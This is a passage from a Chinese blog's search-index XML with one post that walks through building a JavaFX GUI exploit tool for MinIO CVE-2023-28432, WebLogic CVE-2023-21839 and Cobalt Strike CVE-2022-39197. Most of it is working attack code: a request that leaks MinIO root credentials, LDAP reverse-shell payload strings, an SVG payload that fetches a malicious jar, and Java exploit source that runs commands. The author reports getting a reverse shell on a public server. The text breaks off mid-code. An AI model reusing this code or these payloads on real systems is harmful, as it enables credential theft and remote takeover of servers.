<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>GUI漏洞利用工具for:CVE-2023-28432/CVE-2023-21839/CVE-2022-39197</title>
    <link href="/2023/04/20/GUI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
    <url>/2023/04/20/GUI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞利用工具整体设计方案">1. 漏洞利用工具整体设计方案</h2><p>​ 前文研究Cobalt Strike漏洞的时候代码用到Java Swing，本章基于JavaSwing编写一款GUI漏洞测试工具。通过对上述三种漏洞检测利用代码集成，配合按钮、文本框、标签等GUI组件，定制一款漏洞扫描测试交互式应用程序，适用于任何支持Java的操作系统上运行。</p><blockquote><p>三个漏洞的研究分析过程：</p><p><a href="https://romanc9.github.io/2023/03/15/%E6%AF%95%E8%AE%BE%E7%AC%94%E8%AE%B0cs/">CS-CVE-2022-39197</a></p><p><a href="https://romanc9.github.io/2023/03/27/%E6%AF%95%E8%AE%BE%E7%AC%94%E8%AE%B0-Weblogic/">Weblogic-CVE-2023-21839</a></p><p><a href="https://romanc9.github.io/2023/04/17/%E6%AF%95%E8%AE%BE%E7%AC%94%E8%AE%B0minio/">Minio-cve-2023-28432</a></p></blockquote><p>​ 设计思路如图</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042120475.png" alt=" Swing GUI漏洞利用工具的设计思路和实现功能" style="zoom:50%;"></p><h2 id="用户交互界面">2. 用户交互界面</h2><p>​ 通过交互设计使用户的操作更加简单、直观，提高用户的使用体验</p><p>​通过运用数据处理算法中的流程控制算法，根据数据的特定属性和条件选择执行不同的操作。</p><h3 id="可视化交互界面">2.1 可视化交互界面</h3><p>​ 创建Java maven项目，新建class文件，编写GUI主框架界面。</p><p>​1）设置标题、设置标签用来显示提示输入URL、添加文本框接收URL，设置下拉列表显示三种漏洞、检测按钮、显示返回内容的文本框、添加输入命令的文本框、执行按钮等，部分源码下</p><pre><code class="hljs java"><span class="hljs-comment">//添加URL输入标签</span>Label l = <span class="hljs-keyword">new</span> Label(<span class="hljs-string">&quot;请输入URL&quot;</span>);l.setLayoutX(<span class="hljs-number">10</span>);l.setLayoutY(<span class="hljs-number">15</span>);l.setPrefWidth(<span class="hljs-number">70</span>);l.setPrefHeight(<span class="hljs-number">20</span>);<span class="hljs-comment">//添加URL文本框</span>TextArea textArea = <span class="hljs-keyword">new</span> TextArea();textArea.setText(<span class="hljs-string">&quot;请在右侧下拉栏选择poc&quot;</span>);textArea.setLayoutX(<span class="hljs-number">80</span>);textArea.setLayoutY(<span class="hljs-number">10</span>);textArea.setPrefWidth(<span class="hljs-number">250</span>);textArea.setPrefHeight(<span class="hljs-number">10</span>);<span class="hljs-comment">//添加下拉按钮，内容为漏洞字符串数组</span>String strings[] = &#123;<span class="hljs-string">&quot;cs RCE&quot;</span>, <span class="hljs-string">&quot;weblogic RCE&quot;</span>, <span class="hljs-string">&quot;minio 信息泄漏&quot;</span>&#125;;ChoiceBox choiceBox = <span class="hljs-keyword">new</span> ChoiceBox(FXCollections.observableArrayList(strings));choiceBox.setLayoutX(<span class="hljs-number">360</span>);choiceBox.setLayoutY(<span class="hljs-number">15</span>);choiceBox.setPrefHeight(<span class="hljs-number">20</span>);choiceBox.setPrefWidth(<span class="hljs-number">70</span>);<span class="hljs-comment">//添加检测按钮</span>Button button = <span class="hljs-keyword">new</span> Button(<span class="hljs-string">&quot;检测&quot;</span>);button.setLayoutX(<span class="hljs-number">450</span>);button.setLayoutY(<span class="hljs-number">15</span>);button.setPrefWidth(<span class="hljs-number">70</span>);button.setPrefHeight(<span class="hljs-number">20</span>);<span class="hljs-comment">//添加回显文本框</span>TextArea textArea1 = <span class="hljs-keyword">new</span> TextArea();textArea1.setLayoutX(<span class="hljs-number">10</span>);textArea1.setLayoutY(<span class="hljs-number">130</span>);textArea1.setPrefHeight(<span class="hljs-number">300</span>);textArea1.setPrefWidth(<span class="hljs-number">500</span>);textArea1.setWrapText(<span class="hljs-keyword">true</span>);    <span class="hljs-comment">//设置文本框里的文字自动换行</span>textArea1.setText(<span class="hljs-string">&quot;MinIO verify 接口敏感信息泄露漏洞分析(CVE-2023-28432)\n&quot;</span> +        <span class="hljs-string">&quot;Weblogic 未授权远程代码执行漏洞 (CVE-2023-21839)\n&quot;</span> +        <span class="hljs-string">&quot;Cobalt Strike 存储型xss漏洞,可rce(CVE-2022-39197)&quot;</span>);<span class="hljs-comment">//添加执行命令文字提示</span>Label l1 = <span class="hljs-keyword">new</span> Label(<span class="hljs-string">&quot;请输入命令&quot;</span>);l1.setLayoutX(<span class="hljs-number">10</span>);l1.setLayoutY(<span class="hljs-number">70</span>);l1.setPrefWidth(<span class="hljs-number">70</span>);l1.setPrefHeight(<span class="hljs-number">20</span>);<span class="hljs-comment">//添加命令文本框</span>TextArea textArea2 = <span class="hljs-keyword">new</span> TextArea();textArea2.setLayoutX(<span class="hljs-number">80</span>);textArea2.setLayoutY(<span class="hljs-number">60</span>);textArea2.setPrefHeight(<span class="hljs-number">20</span>);textArea2.setPrefWidth(<span class="hljs-number">250</span>);<span class="hljs-comment">//添加执行按钮</span>Button button1 = <span class="hljs-keyword">new</span> Button(<span class="hljs-string">&quot;执行&quot;</span>);button1.setLayoutX(<span class="hljs-number">360</span>);button1.setLayoutY(<span class="hljs-number">70</span>);button1.setPrefHeight(<span class="hljs-number">20</span>);button1.setPrefWidth(<span class="hljs-number">50</span>);textArea2.setText(<span class="hljs-string">&quot;请输入命令...&quot;</span>);</code></pre><p>​2）创建GUI界面代码，创建AnchorPane对象存放界面上的各个控件，这些控件将在界面上显示出来，创建GUI界面主场景，将AnchorPane作为根节点，设置场景的宽度600高度700像素</p><pre><code class="hljs java"><span class="hljs-comment">//添加一个pane，用来装填按钮等插件</span>AnchorPane anchorPane = <span class="hljs-keyword">new</span> AnchorPane();anchorPane.getChildren().addAll(textArea,choiceBox,button,l,textArea1,l1,textArea2,button1);Scene scene = <span class="hljs-keyword">new</span> Scene(anchorPane, <span class="hljs-number">600</span>, <span class="hljs-number">700</span>);GuiDemo.setScene(scene);GuiDemo.show();</code></pre><p>​ 3）框架主界面设置完成，如图</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042124158.png" alt="Swing框架主界面" style="zoom:50%;"></p><h3 id="设计交互功能">2.2 设计交互功能</h3><p>​<strong>用户可通过下拉列表选择不同漏洞，同时界面的文本框呈现不同漏洞的文本提示信息：</strong></p><p>​1）调用JavaFX中的监听器，用于监听ChoiceBox（选择框）中选项的变化。当选项发生变化时，会执行changed方法。在changed方法中，读取下拉列表选中的值，并赋值给name变量，同时在输入命令的文本框设置文字提示先检测漏洞再执行</p><pre><code class="hljs java"><span class="hljs-keyword">final</span> String[] name = &#123;<span class="hljs-keyword">null</span>&#125;;   <span class="hljs-comment">//用来接收用户选项</span><span class="hljs-comment">//设置下拉列表监听事件</span>choiceBox.getSelectionModel().selectedIndexProperty().addListener(<span class="hljs-keyword">new</span> ChangeListener&lt;Number&gt;() &#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">changed</span><span class="hljs-params">(ObservableValue ov, Number value, Number new_value)</span> </span>&#123;        String ChoiceBox_Name = strings[new_value.intValue()];        name[<span class="hljs-number">0</span>] = ChoiceBox_Name;   <span class="hljs-comment">//赋值</span>        textArea2.setText(<span class="hljs-string">&quot;请先检测是否存在漏洞&quot;</span>);  <span class="hljs-comment">//提示</span></code></pre><p>​2）通过name变量判断用户选项，运用流程控制算法对三种不同漏洞在URL输入框、命令输入框、回显文本框通过setText方法给出不同文字提示信息。</p><pre><code class="hljs java"><span class="hljs-keyword">if</span>(name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;minio 信息泄漏&quot;</span>))&#123;    textArea.setText(<span class="hljs-string">&quot;请输入ip，默认端口9000&quot;</span>);  <span class="hljs-comment">//规范输入</span>    textArea1.setText(<span class="hljs-string">&quot;[0] 漏洞前提:MinIO被配置为集群模式\n&quot;</span>+            <span class="hljs-string">&quot;[1] 用法:输入目标ip,无需输入端口,默认9000\n\n&quot;</span>);&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;weblogic RCE&quot;</span>)) &#123;    textArea.setText(<span class="hljs-keyword">null</span>);    textArea2.setText(<span class="hljs-keyword">null</span>);    textArea1.setText(<span class="hljs-string">&quot;[0] 请自行搭建ldap服务器,用法:\n&quot;</span> +            <span class="hljs-string">&quot;[1] 请输入目标ip:端口,例如127.0.0.1:7001\n&quot;</span> +            <span class="hljs-string">&quot;[2] 命令输入ldap地址,例如xx.dnslog.cn,点击检测按钮查看结果\n&quot;</span>+            <span class="hljs-string">&quot;[3] 无需点击执行按钮,点击检测按钮配合ldap服务器即可查看执行效果\n\n&quot;</span>);&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;cs RCE&quot;</span>)) &#123;    textArea.setText(<span class="hljs-string">&quot;点击检测查看反制方法&quot;</span>);    textArea2.setText(<span class="hljs-keyword">null</span>);    <span class="hljs-comment">//自查</span>    textArea1.setText(<span class="hljs-string">&quot;[+] 自查方法:\n&quot;</span>+            <span class="hljs-string">&quot;[0] 受影响版本:Cobalt Strike &lt;= 4.7\n&quot;</span>+            <span class="hljs-string">&quot;[1] 启动cobaltstrike客户端\n&quot;</span>+            <span class="hljs-string">&quot;[2] 添加监听器，修改名称处输入检测代码：\n&quot;</span>+            <span class="hljs-string">&quot;&lt;html&gt;&lt;object classid=&#x27;org.apache.batik.swing.JSVGCanvas&#x27;&gt;&lt;param name=&#x27;URI&#x27; value=&#x27;http://xxx.dnslog.cn/a.svg&#x27;&gt;&lt;/object&gt;&quot;</span>+            <span class="hljs-string">&quot;\n[3] value处url输入dnslog地址,查看回显即可检测\n&quot;</span>+            <span class="hljs-string">&quot;[4] 或者输入任意地址svg查看能否访问\n&quot;</span>+            <span class="hljs-string">&quot;[**] 注意:url地址需以http开头\n\n&quot;</span>);&#125;</code></pre><p>​ 3）漏洞选择，文字提示功能实现, 如图</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042208549.png" alt="工具主页面三种漏洞的用法提示" style="zoom:50%;"></p><p>​4）GUI初步框架和文字提示完成，设置检测按钮功能：当按钮被点击时将根据选择的不同漏洞进入不同语句块，同时设置变量接收用户输入的URL和命令，语句块里即是对漏洞的探测和利用</p><pre><code class="hljs java"><span class="hljs-comment">//添加检测按钮功能</span>button.setOnAction(event -&gt; &#123;    String url = textArea.getText();  <span class="hljs-comment">//接收url</span>    payload=textArea2.getText();  <span class="hljs-comment">//接收命令</span>    <span class="hljs-keyword">if</span> (name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;minio 信息泄漏&quot;</span>))&#123;&#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;weblogic RCE&quot;</span>))&#123;&#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;cs RCE&quot;</span>))&#123;&#125;    <span class="hljs-keyword">else</span> &#123;textArea1.setText(<span class="hljs-string">&quot;未发现漏洞,或请求异常&quot;</span>);&#125;&#125;);</code></pre><h3 id="输入预处理">2.3 输入预处理</h3><p>对用户输入进行数据预处理方面：针对三种不同的漏洞，用户输入要求不同。</p><p>​1）MinIO信息泄露漏洞：内部采用自编写的HttpTemp类进行封装调用进行模拟浏览器发送HTTP请求，封装的HTTP方法参数需要请求的URL、请求的类型(GET/POST)、请求体。而通过针对漏洞地址预置输入规则，用户只需输入目标URL，即可实现漏洞探测</p><p>​2）Weblogic未授权RCE漏洞：用户输入目标URL和端口和LDAP服务器地址，采用制定规则：检查用户是否输入两项数据，有一项未输入则无法检测，回显文本框文字提示漏洞测试用法。默认前缀t3://和ldap://，减少输入错误。</p><p>​ 3）Cobalt StrikeRCE漏洞：用户需输入木马可执行文件绝对路径和SVG文件地址实现反制，制定规则检查用户是否输入数据，为空则无法检测；由于命令行根据空格来分隔参数，且运行漏洞利用的Python文件需要三个参数：Python文件地址、木马地址、SVG地址目标，默认Python文件地址、对数据根据空格进行分参、判断参数数量，用户只输入一个地址则无法探测，回显使用方法，优化输入的准确性。</p><p>​程序运行方面：运用异常值处理技术处理程序中的错误和异常情况，并将结果回显到文本框中。</p><p>​结果处理方面：每次输出均包含格式化的程序运行时间，借此可以帮助评估程序的性能和效率，以便后续进行优化和改进。</p><h2 id="漏洞测试模块">3. 漏洞测试模块</h2><p>其实就是将前文研究的漏洞poc/exp整合到GUI界面里</p><h3 id="minio信息泄露漏洞的探测和利用">3.1MinIO信息泄露漏洞的探测和利用</h3><p>​ 根据MinIO信息泄露原理联合检测按钮和执行按钮设计如下功能：</p><p>​ 1）当点击检测按钮，将发送HTTPPOST请求到目标URL的漏洞地址，如果HTTP响应200返回且返回包里有敏感信息关键词，则回显界面显示有漏洞，否则显示未发现漏洞。appendText方法用于将指定的文本追加到文本框的末尾。这里的HTTP请求本文通过编写HttpTemp类进行封装调用。</p><pre><code class="hljs java"><span class="hljs-keyword">if</span> (name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;minio 信息泄漏&quot;</span>)) &#123;                    <span class="hljs-comment">//调用httptemp类，将返回结果赋值给result变量</span>                    <span class="hljs-keyword">try</span>&#123;                        result = HttpTemp.HTTP(<span class="hljs-string">&quot;http://&quot;</span>+url+<span class="hljs-string">&quot;:9000/minio/bootstrap/v1/verify&quot;</span>,<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-keyword">null</span>);                    &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;                        result =e.toString();                        d =<span class="hljs-keyword">new</span> Date();                        time = <span class="hljs-keyword">new</span> SimpleDateFormat(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>).format(d);                        textArea1.appendText(<span class="hljs-string">&quot;[-]&quot;</span>+time+<span class="hljs-string">&quot; &quot;</span>+url+<span class="hljs-string">&quot; 未发现漏洞\n&quot;</span>);                        textArea2.setText(<span class="hljs-string">&quot;请先检测是否存在漏洞&quot;</span>);                    &#125;                    <span class="hljs-comment">//结果匹配：不区分大小写</span>                    <span class="hljs-keyword">boolean</span> result1 = result.toUpperCase().contains(<span class="hljs-string">&quot;MINIO_ROOT_PASSWORD&quot;</span>) || result.toUpperCase().contains(<span class="hljs-string">&quot;MINIO_ROOT_USER&quot;</span>)|| result.toUpperCase().contains(<span class="hljs-string">&quot;MINIOENV&quot;</span>);                    <span class="hljs-keyword">if</span> (result1) &#123;                        d =<span class="hljs-keyword">new</span> Date();                        time = <span class="hljs-keyword">new</span> SimpleDateFormat(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>).format(d);                        textArea1.appendText(<span class="hljs-string">&quot;[+] &quot;</span>+time+<span class="hljs-string">&quot; &quot;</span>+url+<span class="hljs-string">&quot; 存在漏洞！\n&quot;</span>);  <span class="hljs-comment">//textArea1是结果显示栏</span>                        textArea2.setText(<span class="hljs-string">&quot;无需输入命令，点击执行获取敏感信息&quot;</span>);                    &#125;</code></pre><p>​ 2）HttpTemp类实现HTTPGET/POST请求功能。需要三个参数：请求URL、请求的类型(GET/POST)、请求体</p><p>​(1)首先建立一个HTTP连接，设置UA头，模拟浏览器发送请求，设置连接的输入输出状态为true，根据参数选择请求方法GET/POST，如果有请求体（如POST请求），则将请求体写入输出流中。</p><pre><code class="hljs java">URL url = <span class="hljs-keyword">new</span> URL(requestUrl);HttpURLConnection conn = (HttpURLConnection)url.openConnection();conn.setRequestProperty(<span class="hljs-string">&quot;User-Agent&quot;</span>, <span class="hljs-string">&quot;Mozilla/4.76&quot;</span>);conn.setDoOutput(<span class="hljs-keyword">true</span>);conn.setDoInput(<span class="hljs-keyword">true</span>);conn.setRequestMethod(requestMethod);conn.connect();<span class="hljs-keyword">if</span> (<span class="hljs-keyword">null</span> != outputStr) &#123;    OutputStream os = conn.getOutputStream();    os.write(outputStr.getBytes(StandardCharsets.UTF_8));    os.close();&#125;</code></pre><p>​(2)获取HTTP响应：读取字节流，逐行将服务端返回内容加载到buffer字符串缓冲区，输出打印并作为字符串返回。HTTP连接过程有异常则抛出。</p><pre><code class="hljs java">    InputStream is = conn.getInputStream();    InputStreamReader isr = <span class="hljs-keyword">new</span> InputStreamReader(is, StandardCharsets.UTF_8);    BufferedReader br = <span class="hljs-keyword">new</span> BufferedReader(isr);    buffer = <span class="hljs-keyword">new</span> StringBuilder();    String line = <span class="hljs-keyword">null</span>;    <span class="hljs-keyword">while</span>((line = br.readLine()) != <span class="hljs-keyword">null</span>) &#123;        buffer.append(line);    &#125;&#125; <span class="hljs-keyword">catch</span> (Exception var10) &#123;    var10.printStackTrace();&#125;<span class="hljs-keyword">assert</span> buffer != <span class="hljs-keyword">null</span>;System.out.println(buffer.toString());<span class="hljs-keyword">return</span> buffer.toString();</code></pre><p>​ 3）当点击执行按钮，将返回漏洞获取到的敏感信息：直接将HTTPPOST漏洞地址获取到的响应返回即可</p><pre><code class="hljs java"><span class="hljs-comment">//执行exp</span>button1.setOnAction(event1 -&gt; &#123; <span class="hljs-comment">//button1：执行按钮</span>        <span class="hljs-keyword">if</span>(result1)&#123;            d =<span class="hljs-keyword">new</span> Date();            time = <span class="hljs-keyword">new</span> SimpleDateFormat(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>).format(d);            textArea1.appendText(<span class="hljs-string">&quot;[+]&quot;</span>+time+<span class="hljs-string">&quot; &quot;</span>+url+<span class="hljs-string">&quot; 返回结果：\n&quot;</span>+result+<span class="hljs-string">&quot;\n&quot;</span>);        &#125;&#125;);</code></pre><h4 id="实现效果">实现效果</h4><p>工具测试结果：</p><p>目标地址不存在漏洞的测试如图：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201554911.png" alt="对目标地址不存在该漏洞的检测结果" style="zoom:50%;"></p><p>目标地址点击检测后发现存在漏洞，点击执行后返回获取到的敏感信息，如图</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201554719.png" alt="对存在该漏洞的目标检测的结果" style="zoom:50%;"></p><h3 id="weblogic未授权rce漏洞的探测和利用">3.2Weblogic未授权RCE漏洞的探测和利用</h3><p>​根据Weblogic未授权远程代码执行漏洞原理联合检测按钮设计如下功能：用户提前搭建好LDAP服务器和利用功能，输入目标URL和LDAP服务器地址，点击检测按钮实现对目标进行漏洞探测和利用。</p><pre><code class="hljs java"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;weblogic RCE&quot;</span>))&#123;    <span class="hljs-keyword">if</span>(url == <span class="hljs-keyword">null</span> || payload == <span class="hljs-keyword">null</span>)&#123;        textArea1.appendText(<span class="hljs-string">&quot;[*]用法：目标ip:端口 ldap地址,都不能空！\ne.g. 192.168.1.1:7001 192.168.1.2:1389/Basic/ReverseShell/192.168.1.2/1111\n&quot;</span>);    &#125;<span class="hljs-keyword">else</span> &#123;        CVE_2023_21839.poc(url,payload);        d =<span class="hljs-keyword">new</span> Date();        time = <span class="hljs-keyword">new</span> SimpleDateFormat(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>).format(d);        textArea1.appendText(<span class="hljs-string">&quot;[+] 目标:&quot;</span>+url+<span class="hljs-string">&quot;,请求已发送&quot;</span>+time+<span class="hljs-string">&quot; 自行查看dnslog/ldap服务器检查结果\n&quot;</span>);    &#125;&#125;</code></pre><p>​这里我将漏洞利用功能的具体请求利用代码编写集成在CVE_2023_21839类，在之前介绍Weblogic漏洞原理的章节部分已提及关键代码的解释，这里不再赘述。类的封装入口是URL和LDAP服务器地址，无返回，类功能实现通过构造恶意对象对LDAP服务器发送请求。</p><h4 id="实现效果-1">实现效果</h4><p>​ 工具测试结果:</p><p>​ 1）对目标公网服务器存在该漏洞的探测，如图</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201604645.png" alt="对公网服务器存在该漏洞的检测结果" style="zoom:50%;"></p><p>​</p><p>​2）公网服务器本地搭建LDAP服务器，点击执行按钮反弹内网虚拟机Docker的shell到终端，命令输入1.xxx:1389/Basic/ReverseShell/1.xxx/5003，实现反弹shell，如图</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201606746.png" alt="对公网服务器存在该漏洞的利用结果"></p><h3 id="cobalt-strike-rce漏洞的自查和反制">3.3 Cobalt StrikeRCE漏洞的自查和反制</h3><p>​ 根据Cobalt Strike远程代码执行漏洞原理联合按钮实现以下功能：</p><p>1）点击检测按钮，回显文本框显示如何反制和示例SVG文件源码、jar包源码</p><pre><code class="hljs java"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;cs RCE&quot;</span>))&#123;    textArea1.appendText(<span class="hljs-string">&quot;[+] 反制方法:\n&quot;</span>+            <span class="hljs-string">&quot;[0] 前提：本地已获取到对方木马(beacon.exe)\n&quot;</span>+            <span class="hljs-string">&quot;[1] 反制环境要求：win,python3,pip3安装frida-tools\n&quot;</span>+            <span class="hljs-string">&quot;[2] python已加入环境变量\n&quot;</span>+            <span class="hljs-string">&quot;[3] 自行准备恶意svg文件,jar包,对方能访问到\n&quot;</span> +            <span class="hljs-string">&quot;[4] 命令输入exe绝对路径和svg地址,空格隔开,点击执行实现反制\n&quot;</span>+            <span class="hljs-string">&quot;[payload eg]:beacon.exe http://127.0.0.1:4444/evil.svg\n\n&quot;</span>);    textArea1.appendText(<span class="hljs-string">&quot;[示例] svg源码:\n&quot;</span>+                    <span class="hljs-string">&quot;&lt;svg xmlns=\&quot;http://www.w3.org/2000/svg\&quot; xmlns:xlink=\&quot;http://www.w3.org/1999/xlink\&quot; version=\&quot;1.0\&quot;&gt;\n&quot;</span> +                            <span class="hljs-string">&quot;&lt;script type=\&quot;application/java-archive\&quot; xlink:href=\&quot;http://127.0.0.1:9898/EvilJar-calc.jar\&quot;/&gt;\n&quot;</span> +                            <span class="hljs-string">&quot;&lt;text&gt;CVE-2022-39197&lt;/text&gt;\n&quot;</span> +                            <span class="hljs-string">&quot;&lt;/svg&gt;&quot;</span>+<span class="hljs-string">&quot;\n\n&quot;</span>+                    <span class="hljs-string">&quot;[示例] jar包里的恶意代码源码:弹出计算器,适用不同系统:macos/linux/windows,注意安装依赖,按需修改payload\n&quot;</span>+<span class="hljs-string">&quot;import org.w3c.dom.events.Event;\n&quot;</span> +        <span class="hljs-string">&quot;import org.w3c.dom.events.EventListener;\n&quot;</span> +        <span class="hljs-string">&quot;import org.w3c.dom.svg.EventListenerInitializer;\n&quot;</span> +        <span class="hljs-string">&quot;import org.w3c.dom.svg.SVGDocument;\n&quot;</span> +        <span class="hljs-string">&quot;import org.w3c.dom.svg.SVGSVGElement;\n&quot;</span> +        <span class="hljs-string">&quot;import java.util.*;\n&quot;</span> +        <span class="hljs-string">&quot;import java.io.*;\n&quot;</span> +        <span class="hljs-string">&quot;public class Exploit implements EventListenerInitializer &#123;\n&quot;</span> +        <span class="hljs-string">&quot;    public void initializeEventListeners(SVGDocument document) &#123;\n&quot;</span> +        <span class="hljs-string">&quot;        SVGSVGElement root = document.getRootElement();\n&quot;</span> +        <span class="hljs-string">&quot;        EventListener listener = new EventListener() &#123;\n&quot;</span> +        <span class="hljs-string">&quot;            public void handleEvent(Event event) &#123;\n&quot;</span> +        <span class="hljs-string">&quot;                try &#123;\n&quot;</span> +        <span class="hljs-string">&quot;                    String OS = System.getProperty(\&quot;os.name\&quot;, \&quot;unknown\&quot;).toLowerCase(Locale.ROOT);\n&quot;</span> +        <span class="hljs-string">&quot;                    if (OS.contains(\&quot;win\&quot;)) &#123;\n&quot;</span> +        <span class="hljs-string">&quot;                        Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);\n&quot;</span> +        <span class="hljs-string">&quot;                    &#125; else if (OS.contains(\&quot;mac\&quot;)) &#123;\n&quot;</span> +        <span class="hljs-string">&quot;                        Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);\n&quot;</span> +        <span class="hljs-string">&quot;                    &#125; else if (OS.contains(\&quot;nux\&quot;)) &#123;\n&quot;</span> +        <span class="hljs-string">&quot;                        Runtime.getRuntime().exec(\&quot;/usr/bin/mate-calc\&quot;);\n&quot;</span> +        <span class="hljs-string">&quot;                    &#125;\n&quot;</span> +        <span class="hljs-string">&quot;                &#125; catch (Exception e) &#123;&#125;\n&quot;</span> +        <span class="hljs-string">&quot;            &#125;\n&quot;</span> +        <span class="hljs-string">&quot;        &#125;;\n&quot;</span> +        <span class="hljs-string">&quot;        root.addEventListener(\&quot;SVGLoad\&quot;, listener, false);\n&quot;</span> +        <span class="hljs-string">&quot;    &#125;\n&quot;</span> +        <span class="hljs-string">&quot;&#125;\n\n&quot;</span>);</code></pre><p>​2）用户提前准备好获取到的木马文件、目标主机能访问的SVG文件和实现远程代码执行功能的jar包。点击执行按钮设计如下功能：通过命令处的文本框接收用户输入的木马可执行文件绝对地址和SVG文件地址，点击执行按钮调用cs_rce类，Frida运行并注入可执行文件，修改进程列表里的该可执行文件名为包含用户输入的SVG文件地址的漏洞payload，CobaltStrike客户端用户查看进程信息即触发访问SVG文件里设置的jar包，执行jar包设置的代码，实现反制。</p><pre><code class="hljs java"><span class="hljs-comment">//button1：执行按钮,反制</span>button1.setOnAction(event2 -&gt; &#123;    payload=textArea2.getText();  <span class="hljs-comment">//接收命令</span>    <span class="hljs-keyword">if</span> (name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;cs RCE&quot;</span>))&#123;        <span class="hljs-keyword">if</span> (payload== <span class="hljs-keyword">null</span>)&#123;            textArea1.appendText(<span class="hljs-string">&quot;[*]命令不能空！\ne.g:beacon.exe http://127.0.0.1:4444/evil.svg\n\n&quot;</span>);        &#125;        <span class="hljs-keyword">else</span>&#123;            d = <span class="hljs-keyword">new</span> Date();            time = <span class="hljs-keyword">new</span> SimpleDateFormat(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>).format(d);            textArea1.appendText(<span class="hljs-string">&quot;[+]运行成功！&quot;</span> + time + <span class="hljs-string">&quot;自行查看结果：\n&quot;</span>);            textArea1.appendText(cs_rce.poc(payload));&#125;    &#125;&#125;);</code></pre><p>​3）这里我将执行漏洞的代码封装在cs_rce类：通过读取并<strong>生成临时文件的方法</strong>调用项目resources目录下的cve_2022_39197.py文件，该文件关键利用代码在之前CobaltStrike章节的漏洞原理里具体解释过。</p><p>​(1)cs_rce类：从当前类所在的resources目录中获取名为cve_2022_39197.py的文件内容，然后将其写入到同名的文件中。具体实现是通过创建一个FileOutputStream对象来将输入流中的数据写入到同名文件中。在这个过程中，使用一个缓冲区来提高效率。</p><pre><code class="hljs java">String filename = <span class="hljs-string">&quot;cve_2022_39197.py&quot;</span>;InputStream inputStream = cs_rce.class.getResourceAsStream(<span class="hljs-string">&quot;/&quot;</span>+filename);  <span class="hljs-comment">//&quot;/&quot;表示在classpath的根目录下查找</span><span class="hljs-comment">//System.out.println(&quot;[+]&quot;+filePath+&quot;\n&quot;);</span>File file = <span class="hljs-keyword">new</span> File(filename);FileOutputStream outputStream = <span class="hljs-keyword">new</span> FileOutputStream(file);  <span class="hljs-comment">// 将inputStream写入到临时文件file中</span><span class="hljs-keyword">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<span class="hljs-keyword">int</span> len;<span class="hljs-keyword">while</span> ((len = inputStream.read(buffer)) != -<span class="hljs-number">1</span>) &#123;    outputStream.write(buffer, <span class="hljs-number">0</span>, len); &#125;</code></pre><p>​(2)然后调用Java的Runtime类执行该Python文件，读取Python运行结果并追加输出到回显文本框：</p><pre><code class="hljs java"><span class="hljs-comment">// 执行python脚本</span><span class="hljs-comment">//String[] args = new String[]&#123;&quot;python3&quot;, file.getAbsolutePath()&#125;;</span>String s=<span class="hljs-string">&quot;python3 &quot;</span>+file.getAbsolutePath()+<span class="hljs-string">&quot; &quot;</span>+target;System.out.println(s);Process proc = Runtime.getRuntime().exec(s);<span class="hljs-comment">// 执行py文件</span><span class="hljs-comment">//获取输入流</span>BufferedReader in = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(proc.getInputStream()));<span class="hljs-comment">//获取错误流</span>BufferedReader errorStreamReader = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(proc.getErrorStream()));String line = <span class="hljs-keyword">null</span>;String result=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">while</span> ((line = in.readLine()) != <span class="hljs-keyword">null</span>) &#123; <span class="hljs-comment">//读取输入流</span>    result =result+line+<span class="hljs-string">&quot;\n&quot;</span>;&#125;<span class="hljs-keyword">while</span> ((line = errorStreamReader.readLine()) != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">//读取错误流</span>    result =result+line+<span class="hljs-string">&quot;\n&quot;</span>;&#125;in.close();<span 